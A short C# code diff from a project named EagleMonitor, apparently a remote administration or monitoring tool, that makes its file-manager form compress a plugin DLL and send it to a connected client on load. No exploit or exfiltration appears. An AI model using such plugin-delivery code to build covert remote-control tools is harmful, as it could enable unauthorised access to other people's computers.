@@ -31,7 +31,13 @@ namespace EagleMonitor.Forms
         private void FileManagerForm_Load(object sender, EventArgs e)
         {
             Miscellaneous.Enable(this.fileListView);
+            //new Guna.UI2.WinForms.Helpers.ListViewScrollHelper(fileListView, guna2VScrollBar1, true);
+            DiskPacket diskPacket = new DiskPacket();
+            diskPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\FileManager.dll"), 1);
+
+            this.clientHandler.SendPacket(diskPacket);
         }
+
         private void diskComboBox_SelectedIndexChanged(object sender, EventArgs e)
         {
             this.labelPath.Text = diskComboBox.Text;
